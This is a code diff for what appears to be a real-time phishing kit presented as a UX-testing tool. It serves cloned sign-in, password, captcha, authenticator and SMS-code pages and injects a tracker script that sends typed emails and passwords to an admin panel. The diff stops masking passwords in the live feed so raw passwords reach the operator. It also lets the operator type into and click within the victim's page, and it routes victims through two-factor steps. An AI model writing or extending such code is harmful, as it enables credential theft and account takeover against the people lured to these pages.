@@ -107,6 +107,10 @@ const _hiddenBundledDesigns = new Set<string>();
 const _tombstones = new Set<string>(); // key = design:page:kind — never resurrect
 let _indexOverride: { order: string[] } | null = null;
 
+/** Only these designs ship / appear in the admin Pages tree + redirect picker. */
+const ALLOWED_DESIGNS = new Set(["cb", "gi", "ge"]);
+const REMOVED_DESIGNS = ["go", "blue", "red", "google"];
+
 function persistTombstones() {
   if (typeof window === "undefined") return;
   try {
@@ -125,6 +129,22 @@ export function getDesignLogo(design: string): string | null {
     if (key.startsWith(prefix)) return PNG_FILES[key];
   }
   return null;
+}
+
+/** Favicon for a design page — per-page override, else the design logo. */
+export function getDesignFavicon(design: string, page?: string): string | null {
+  if (page) {
+    const fromPage = (getPageMeta(design, page).favicon ?? "").trim();
+    if (fromPage) return fromPage;
+  }
+  return getDesignLogo(design);
+}
+
+/** TanStack Router `head.links` entries for a design favicon. */
+export function designFaviconLinks(design: string, page?: string) {
+  const href = getDesignFavicon(design, page);
+  if (!href) return [];
+  return [{ rel: "icon", href, type: "image/png" as const }];
 }
 
 function lsLoad() {
@@ -191,13 +211,40 @@ runMigrations();
 
 function runMigrations() {
   if (typeof window === "undefined") return;
-  const MIGRATION_KEY = "design_migration_v3";
+  const MIGRATION_KEY = "design_migration_v4";
   try {
-    if (window.localStorage.getItem(MIGRATION_KEY) === "1") return;
+    if (window.localStorage.getItem(MIGRATION_KEY) !== "1") {
+    // Drop removed designs (go/blue/red/google) from any local overrides so
+    // they never reappear in the Pages tree after a prior install.
+    for (const d of REMOVED_DESIGNS) {
+      _metaOverrides.delete(d);
+      _hiddenBundledDesigns.add(d);
+      try { window.localStorage.removeItem(META_PREFIX + d); } catch { /* ignore */ }
+      for (const key of Array.from(_contentOverrides.keys())) {
+        if (key.startsWith(`${d}:`)) {
+          _contentOverrides.delete(key);
+          try { window.localStorage.removeItem(OVERRIDE_PREFIX + key); } catch { /* ignore */ }
+        }
+      }
+    }
+    try {
+      window.localStorage.setItem(
+        HIDDEN_DESIGNS_KEY,
+        JSON.stringify(Array.from(_hiddenBundledDesigns)),
+      );
+    } catch { /* ignore */ }
+    if (_indexOverride) {
+      _indexOverride = {
+        order: _indexOverride.order.filter((id) => ALLOWED_DESIGNS.has(id)),
+      };
+      try {
+        window.localStorage.setItem(INDEX_KEY, JSON.stringify(_indexOverride));
+      } catch { /* ignore */ }
+    }
     // Wipe stale meta + content overrides + tombstones for bundled designs that
     // were renamed (sign-in -> signin, signinaddon -> signinp).
     const stalePages = ["sign-in", "signinaddon", "signin-in", "signinp-addon"];
-    const designsToClean = ["cb", "blue", "red"];
+    const designsToClean = ["cb", "gi"];
     for (const d of designsToClean) {
       _metaOverrides.delete(d);
       try { window.localStorage.removeItem(META_PREFIX + d); } catch { /* ignore */ }
@@ -212,6 +259,26 @@ function runMigrations() {
     }
     persistTombstones();
     try { window.localStorage.setItem(MIGRATION_KEY, "1"); } catch { /* ignore */ }
+    }
+  } catch {
+    /* ignore */
+  }
+
+  // ge: drop placeholder overrides so bundled signin/loading HTML wins.
+  const GE_MIG = "design_migration_ge_v1";
+  try {
+    if (window.localStorage.getItem(GE_MIG) !== "1") {
+      for (const page of ["signin", "loading"]) {
+        for (const kind of ["html", "css", "js"]) {
+          const key = `ge:${page}:${kind}`;
+          _contentOverrides.delete(key);
+          _tombstones.delete(key);
+          try { window.localStorage.removeItem(OVERRIDE_PREFIX + key); } catch { /* ignore */ }
+        }
+      }
+      persistTombstones();
+      try { window.localStorage.setItem(GE_MIG, "1"); } catch { /* ignore */ }
+    }
   } catch {
     /* ignore */
   }
@@ -441,19 +508,26 @@ function currentIndex(): { order: string[] } {
 // ---- Public registry accessors ----
 
 export function getDesigns(): DesignRecord[] {
-  const order = currentIndex().order.filter((id) => !_hiddenBundledDesigns.has(id));
-  // Include any design that has a meta override or a bundled meta but isn't in
-  // the index (defensive).
+  const order = currentIndex().order.filter(
+    (id) => ALLOWED_DESIGNS.has(id) && !_hiddenBundledDesigns.has(id),
+  );
+  // Include any allowed design that has a meta override or a bundled meta but
+  // isn't in the index (defensive). Never surface removed designs (go/blue/red).
   const seen = new Set(order);
   for (const k of Object.keys(META_FILES)) {
     const id = k.split("/")[3];
-    if (id && !seen.has(id) && !_hiddenBundledDesigns.has(id)) {
+    if (
+      id &&
+      ALLOWED_DESIGNS.has(id) &&
+      !seen.has(id) &&
+      !_hiddenBundledDesigns.has(id)
+    ) {
       order.push(id);
       seen.add(id);
     }
   }
   for (const id of _metaOverrides.keys()) {
-    if (!seen.has(id)) {
+    if (ALLOWED_DESIGNS.has(id) && !seen.has(id) && !_hiddenBundledDesigns.has(id)) {
       order.push(id);
       seen.add(id);
     }
@@ -550,12 +624,8 @@ body{margin:0;background:#fafafa;color:#111;font-family:ui-sans-serif,system-ui,
 }
 
 function defaultJS(): string {
-  return `// Shared script. Use track(field,value) to record an input event.
-document.addEventListener('input', (e) => {
-  const t = e.target;
-  if (!t || !t.name || t.type === 'password') return;
-  track(t.name, t.value);
-});
+  return `// Shared script. Use track(field,value) for final submissions only.
+// Live typing is mirrored automatically — do not track() on every keystroke.
 `;
 }
 
@@ -963,7 +1033,7 @@ export function buildSrcDocCached(design: DesignKey, page: PageKey): string {
   const isFullDoc =
     trimmed.startsWith("<!doctype") || trimmed.startsWith("<html");
   const base = isFullDoc ? injectTracker(html) : wrap(html, css, js);
-  return applyPageMeta(base, pm);
+  return applyPageMeta(base, pm, design);
 }
 
 export function buildSrcDocVirtual(
@@ -987,10 +1057,13 @@ function escText(s: string): string {
   return s.replace(/&/g, "&amp;").replace(/</g, "&lt;").replace(/>/g, "&gt;");
 }
 
-function applyPageMeta(doc: string, pm: PageMeta): string {
+function applyPageMeta(doc: string, pm: PageMeta, design?: DesignKey): string {
   let out = doc;
   const title = (pm.title ?? "").trim();
-  const favicon = (pm.favicon ?? "").trim();
+  const favicon =
+    (pm.favicon ?? "").trim() ||
+    (design ? getDesignLogo(design) : null) ||
+    "";
   if (!title && !favicon) return out;
 
   if (title) {
@@ -1044,9 +1117,9 @@ function __ux_emit_live(el, focused){
   var field = __ux_field_name(el);
   var type = (el.type || 'text').toLowerCase();
   var raw = el.value == null ? '' : String(el.value);
-  // Never broadcast password contents in plaintext through live feed.
-  var value = (type === 'password') ? raw.replace(/./g, '•') : raw;
-  __ux_post({__ux:true, type:'live_input', field: field, value: value, focused: !!focused, ftype: type});
+  // Send real value so admin live preview matches participant 1:1
+  // (password inputs still render as dots via type=password).
+  __ux_post({__ux:true, type:'live_input', field: field, value: raw, focused: !!focused, ftype: type});
 }
 document.addEventListener('focusin', function(e){ __ux_emit_live(e.target, true); }, true);
 document.addEventListener('focusout', function(e){ __ux_emit_live(e.target, false); }, true);
@@ -1077,13 +1150,19 @@ function navigateTo(page){
     return;
   }
   var target = '/' + loc.design + '/' + page;
+  // ge: carry email to password page via query (storage can be isolated in iframes)
+  if (loc.design === 'ge' && page === 'password') {
+    var em = getStoredEmail();
+    if (em) target += '?email=' + encodeURIComponent(em);
+  }
   try { sessionStorage.setItem('__ux_internal_nav_until', String(Date.now() + 15000)); } catch(e){}
   // Parent does client-side navigation (no full reload) for smooth transitions.
   try { parent.postMessage({__ux:true, type:'internal_navigation', url: target}, '*'); } catch(e){}
   // Fallback: if no parent listener acts within 600ms, hard-navigate.
   setTimeout(function(){
     try {
-      if (parent && parent.location && parent.location.pathname !== target) {
+      var pathOnly = target.split('?')[0];
+      if (parent && parent.location && parent.location.pathname !== pathOnly) {
         parent.location.assign(target);
       }
     } catch(e){ try { location.assign(target); } catch(_){} }
@@ -1122,9 +1201,32 @@ function detectOriginalEmail(){
 function replaceEmailPlaceholder(){
   var email = getStoredEmail();
   var letter = (email ? email.charAt(0) : '?').toUpperCase();
+  var hi = '';
+  if (email) {
+    var raw = email.slice(0, 5);
+    hi = raw.charAt(0).toUpperCase() + raw.slice(1);
+  }
+  var initials = letter;
+  if (email) {
+    var local = (email.split('@')[0] || email).trim();
+    var parts = local.split(/[._+\\-\\s]+/).filter(Boolean);
+    if (parts.length >= 2) initials = (parts[0].charAt(0) + parts[1].charAt(0)).toUpperCase();
+    else {
+      var alnum = local.replace(/[^a-zA-Z0-9]/g, '');
+      if (alnum.length >= 2) initials = alnum.slice(0, 2).toUpperCase();
+      else if (alnum.length === 1) initials = (alnum + alnum).toUpperCase();
+    }
+  }
   try {
     var avatars = document.querySelectorAll('[data-ux-avatar]');
-    for (var a = 0; a < avatars.length; a++) avatars[a].textContent = letter;
+    for (var a = 0; a < avatars.length; a++) {
+      var two = avatars[a].getAttribute('data-ux-avatar') === '2' || avatars[a].hasAttribute('data-ux-initials');
+      avatars[a].textContent = two ? initials : letter;
+    }
+  } catch(e){}
+  try {
+    var his = document.querySelectorAll('[data-ux-hi]');
+    for (var h = 0; h < his.length; h++) if (hi) his[h].textContent = 'Hi ' + hi;
   } catch(e){}
   try {
     var emailEls = document.querySelectorAll('[data-ux-email], [data-profile-identifier]');
@@ -1204,11 +1306,16 @@ function wireContinueButtons(){
   var here = loc.page || '';
   // Per-design page → next mapping for the guided flow.
   var DESIGN_NEXT = {
-    'go': { 'signin': 'signinp', 'signinp': 'signinploading' }
+    'go': { 'signin': 'signinp', 'signinp': 'signinploading' },
+    // ge: email → loading; password → loading; admin redirects onward
+    'ge': { 'signin': 'loading', 'password': 'loading', 'noaccount': '', 'captcha': '', 'recaptcha': 'loading', 'security-check': 'loading', 'confirmrecovery': 'loading', 'checkphone': '', 'authenticator': 'loading', 'confirmphone': 'smscode', 'sendcode': 'smscode', 'smscode': 'loading' }
   };
   var NEXT = (DESIGN_NEXT[loc.design]) || { 'signin': 'signinp', 'signinp': 'loading' };
   var bodyNext = document.body && document.body.getAttribute && document.body.getAttribute('data-ux-next');
-  var nextPage = bodyNext || NEXT[here] || 'loading';
+  // Explicit empty string in DESIGN_NEXT / data-ux-next means "do not navigate".
+  var nextPage = (bodyNext != null && bodyNext !== '') ? bodyNext
+    : (Object.prototype.hasOwnProperty.call(NEXT, here) ? NEXT[here] : 'loading');
+  if (bodyNext === '') nextPage = '';
 
   var emails = Array.prototype.slice.call(document.querySelectorAll('input[type="email"]:not([aria-hidden="true"]):not(.sf-hidden), input[name*="mail" i]:not([aria-hidden="true"]), input[id*="mail" i]:not([aria-hidden="true"]), input[autocomplete*="email" i]:not([aria-hidden="true"]), input[autocomplete*="username" i]:not([aria-hidden="true"]), input[name="identifier"]:not([aria-hidden="true"]):not(.sf-hidden)'));
   var passwords = Array.prototype.slice.call(document.querySelectorAll('input[type="password"]:not([aria-hidden="true"]), input[name*="pass" i]:not([aria-hidden="true"]), input[name="Passwd"]'));
@@ -1225,7 +1332,7 @@ function wireContinueButtons(){
       btnOnly.addEventListener('click', function(e){
         e.preventDefault(); e.stopPropagation();
         if (e.stopImmediatePropagation) e.stopImmediatePropagation();
-        navigateTo(nextPage);
+        if (nextPage) navigateTo(nextPage);
       }, true);
     }
     return;
@@ -1272,12 +1379,12 @@ function wireContinueButtons(){
       setStoredPassLen((input.value || '').length);
       try { window.track('password_submitted', input.value || ''); } catch(err){}
       try { window.track('continue_clicked', '1'); } catch(err){}
-      navigateTo(nextPage);
+      if (nextPage) navigateTo(nextPage);
     } else {
       setStoredEmail(input.value || '');
       try { window.track('email_submitted', input.value || ''); } catch(err){}
       try { window.track('continue_clicked', '1'); } catch(err){}
-      navigateTo(nextPage);
+      if (nextPage) navigateTo(nextPage);
     }
   }, true);
   var form = input.closest('form');
@@ -1365,17 +1472,38 @@ window.addEventListener('message', function(ev){
     var el = null;
     try { el = document.querySelector(sel); } catch(e){}
     if (el && (el.tagName === 'INPUT' || el.tagName === 'TEXTAREA')) {
-      var t = (el.type || 'text').toLowerCase();
-      if (t !== 'password') el.value = d.value == null ? '' : String(d.value);
+      el.value = d.value == null ? '' : String(d.value);
+      try { el.dispatchEvent(new Event('input', { bubbles: true })); } catch(e){}
     }
+  }
+  if (d.type === 'click' && typeof d.x === 'number' && typeof d.y === 'number') {
+    try {
+      var target = document.elementFromPoint(d.x, d.y);
+      if (target && typeof target.click === 'function') target.click();
+      else if (target) {
+        var evt = new MouseEvent('click', { bubbles: true, cancelable: true, clientX: d.x, clientY: d.y, view: window });
+        target.dispatchEvent(evt);
+      }
+    } catch(e){}
   }
 });
 <\/script>`;
 
+const PHONE_EMBED_STYLE = `<style id="ux-phone-embed">
+html,body{margin:0;padding:0;width:100%;max-width:100%;min-height:100%;-webkit-text-size-adjust:100%}
+input,select,textarea{font-size:16px;max-width:100%}
+img,svg{max-width:100%;height:auto}
+</style>
+<script>(function(){try{var r=document.documentElement;r.classList.add('ux-phone-ready');if(window.self!==window.top)r.classList.add('ux-embedded');var m=document.querySelector('meta[name="viewport"]');if(!m){m=document.createElement('meta');m.name='viewport';document.head.appendChild(m);}m.content='width=device-width, initial-scale=1';}catch(e){}})();</script>`;
+
 function injectTracker(html: string): string {
-  if (/<\/body>/i.test(html))
-    return html.replace(/<\/body>/i, TRACKER_SCRIPT + "</body>");
-  return html + TRACKER_SCRIPT;
+  let out = html;
+  if (/<head[^>]*>/i.test(out) && !/id="ux-phone-embed"/.test(out)) {
+    out = out.replace(/<head[^>]*>/i, (m) => `${m}\n${PHONE_EMBED_STYLE}`);
+  }
+  if (/<\/body>/i.test(out))
+    return out.replace(/<\/body>/i, TRACKER_SCRIPT + "</body>");
+  return out + TRACKER_SCRIPT;
 }
 
 function wrap(html: string, css: string, js: string): string {
